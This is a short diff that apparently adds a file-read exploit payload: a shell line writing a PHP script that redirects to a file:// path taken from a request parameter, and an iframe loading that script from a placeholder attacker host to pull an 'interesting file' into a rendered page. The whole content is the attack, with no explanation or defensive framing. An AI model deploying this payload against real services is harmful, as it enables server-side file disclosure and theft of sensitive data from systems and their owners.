@@ -1,0 +1,4 @@
+echo "<?php header('location:file://'.$_REQUEST['x']); ?>" > ex.php
+
+
+<iframe height="2000" width="800" src="http://{IP}:{PORT}/ex.php?x={PATH_TO_INTERESTING_FILE}"></iframe>
